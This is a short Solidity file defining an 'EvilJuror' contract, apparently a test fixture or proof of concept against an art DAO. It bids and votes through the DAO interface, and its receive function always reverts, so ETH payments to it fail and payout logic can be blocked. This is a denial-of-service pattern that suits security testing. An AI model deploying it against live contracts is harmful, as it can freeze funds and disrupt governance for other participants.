pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface DAO {
    enum VoteOption {
       None,
        Artist,
        Buyer,
        Neither
    }
    function bid(uint256) external;
    function vote(uint256, uint) external;
}

contract  EvilJuror is IERC721Receiver {

    DAO artdao;
    constructor (address dao) payable {
        artdao = DAO(dao);
    }

    function makebid(uint256 val) public payable {
         address(artdao).call{value: 100}(abi.encodeWithSignature("bid(uint256)", val));
    }
    function justvote(uint256 id) public {
        artdao.vote(id, 2);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // reverts on eth transfer when is juror
    receive() external payable {
        revert("i'm evil");
    }
}